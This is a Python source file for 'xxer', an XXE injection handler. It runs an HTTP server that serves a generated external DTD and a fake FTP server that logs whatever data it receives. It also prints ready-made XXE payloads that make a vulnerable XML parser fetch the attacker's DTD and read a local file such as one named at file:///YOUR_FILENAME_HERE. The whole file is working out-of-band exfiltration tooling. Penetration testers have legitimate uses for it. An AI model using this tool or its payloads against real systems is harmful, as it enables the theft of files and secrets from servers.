#!/usr/bin/env python

# SocketServer code borrow liberally from https://pymotw.com/2/SocketServer/

# Application global vars
VERSION = "1.1"
PROG_NAME = "xxer"
PROG_DESC = "XXE Injection Handler"
PROG_EPILOG = "Originally from https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb, rewritten in Python by TheTwitchy"
DEBUG = True

httpd = None
ftpd = None

# Application imports.

# Python 2/3 imports
try:
    from SimpleHTTPServer import SimpleHTTPRequestHandler
except ImportError:
    from http.server import SimpleHTTPRequestHandler

try:
    from SocketServer import TCPServer
except ImportError:
    from socketserver import TCPServer

import sys, signal, threading, time, os, socket


class FTPserverThread(threading.Thread):
    def __init__(self, conn_addr):
        conn, addr = conn_addr
        self.conn = conn
        self.addr = addr
        threading.Thread.__init__(self)

    def run(self):
        self.conn.send('220 Welcome!\r\n')
        while True:
            data = self.conn.recv(1024)
            if not data:
                break
            else:
                print_info("FTP: recvd '%s'" % data.strip())
                if "LIST" in data:
                    self.conn.send("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test\r\n")
                    self.conn.send("150 Opening BINARY mode data connection for /bin/ls\r\n")
                    self.conn.send("226 Transfer complete.\r\n")
                elif "USER" in data:
                    self.conn.send("331 password please\r\n")
                elif "PORT" in data:
                    self.conn.send("200 PORT command ok\r\n")
                elif "RETR" in data:
                    self.conn.send('500 Sorry.\r\n\r\n')
                else:
                    self.conn.send("230 more data please!\r\n")


class FTPserver(threading.Thread):
    def __init__(self, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        threading.Thread.__init__(self)

    def run(self):
        self.sock.listen(5)
        while True:
            th = FTPserverThread(self.sock.accept())
            th.daemon = True
            th.start()

    def stop(self):
        self.sock.close()


class HTTPdTCPServer(TCPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)


# Try to import argparse, not available until Python 2.7
try:
    import argparse
except ImportError:
    print_err("Failed to import argparse module. Needs python 2.7+.")
    quit()
# Try to import termcolor, ignore if not available.
DO_COLOR = True
try:
    import termcolor
except ImportError:
    DO_COLOR = False


def try_color(string, color):
    if DO_COLOR:
        return termcolor.colored(string, color)
    else:
        return string


# Print some info to stdout
def print_info(*args):
    sys.stdout.write(try_color("info: ", "green"))
    sys.stdout.write(try_color(" ".join(map(str, args)) + "\n", "green"))


# Print an error to stderr
def print_err(*args):
    sys.stderr.write(try_color("error: ", "red"))
    sys.stderr.write(try_color(" ".join(map(str, args)) + "\n", "red"))


# Print a debug statement to stdout
def print_debug(*args):
    if DEBUG:
        sys.stderr.write(try_color("debug: ", "blue"))
        sys.stderr.write(try_color(" ".join(map(str, args)) + "\n", "blue"))


# Handles early quitters.
def signal_handler(signal, frame):
    global httpd
    global ftpd

    try:
        httpd.server_close()
    except:
        pass

    try:
        ftpd.stop()
    except:
        pass

    print("")
    quit(0)


# Because.
def print_header():
    print("                 ")
    print(" _ _ _ _ ___ ___ ")
    print("|_'_|_'_| -_|  _|")
    print("|_,_|_,_|___|_|  ")
    print("                 ")
    print("version " + VERSION)
    print("")


# Argument parsing which outputs a dictionary.
def parseArgs():
    # Setup the argparser and all args
    parser = argparse.ArgumentParser(prog=PROG_NAME, description=PROG_DESC, epilog=PROG_EPILOG)
    parser.add_argument("-v", "--version", action="version", version="%(prog)s " + VERSION)
    parser.add_argument("-q", "--quiet", help="surpress extra output", action="store_true", default=False)
    parser.add_argument("-p", "--http", help="HTTP server port", type=int, default=8080)
    parser.add_argument("-P", "--ftp", help="FTP server port", type=int, default=2121)
    parser.add_argument("-H", "--hostname", help="Hostname of this server", required=True)
    parser.add_argument("-d", "--dtd",
                        help="the location of the DTD template. client_file templates allow the filename to be specified by the XXE payload instead of restarting the server",
                        default="ftp.dtd.template")
    return parser.parse_args()


# Main application entry point.
def main():
    global httpd
    global ftpd

    # Signal handler to catch CTRL-C (quit immediately)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    argv = parseArgs()

    # Print out some sweet ASCII art.
    if not argv.quiet:
        print_header()

    # Begin application logic.

    if not os.path.isfile(argv.dtd):
        print_err("DTD template not found.")
        return -1
    elif os.path.isfile("ext.dtd"):
        print_info("Old DTD found. This file is going to be deleted.")

    print_info("Generating new DTD file.")
    fd_template = open(argv.dtd, "r")
    dtd_str = fd_template.read()
    dtd_str = dtd_str.replace("%HOSTNAME%", argv.hostname)
    dtd_str = dtd_str.replace("%FTP_PORT%", str(argv.ftp))
    fd_dtd = open("ext.dtd", "w")
    fd_dtd.write(dtd_str)
    fd_template.close()
    fd_dtd.close()

    # For httpd, derve files from the current directory
    httpd_handler = SimpleHTTPRequestHandler
    httpd = HTTPdTCPServer(("0.0.0.0", argv.http), httpd_handler)

    print_info("Starting xxer_httpd on port %d" % (argv.http))
    t_httpd = threading.Thread(target=httpd.serve_forever)
    t_httpd.setDaemon(True)
    t_httpd.start()

    print_info("Starting xxer_ftpd on port %d" % (argv.ftp))

    t_ftpd = FTPserver(argv.ftp)
    t_ftpd.setDaemon(True)
    t_ftpd.start()
    ftpd = t_ftpd

    # Prompts are different depending on the template
    if (argv.dtd == "ftp.dtd.template" or argv.dtd == "error.dtd.template"):
        print_info("Servers started. Use the following payload (with URL-encoding):\n\n" \
                   "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xmlrootname [<!ENTITY %% aaa SYSTEM \"http://%s:%d/ext.dtd\">%%aaa;%%ccc;%%ddd;]>" \
                   "\n\n" % (argv.hostname, argv.http))
    elif (argv.dtd == "ftp.client_file.dtd.template" or argv.dtd == "error.client_file.dtd.template"):
        print_info("Servers started. Use the following payload (with URL-encoding):\n\n" \
                   "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xmlrootname [<!ENTITY %% aaa SYSTEM \"http://%s:%d/ext.dtd\"><!ENTITY %% bbb SYSTEM \"file:///YOUR_FILENAME_HERE\">%%aaa;%%ccc;%%ddd;]>" \
                   "\n\n" % (argv.hostname, argv.http))
    else:
        print_info("Servers started. Custom template detected, sample payload unknown.\n\n")

    while True:
        time.sleep(1000)


if __name__ == "__main__":
    main()
    quit(0)
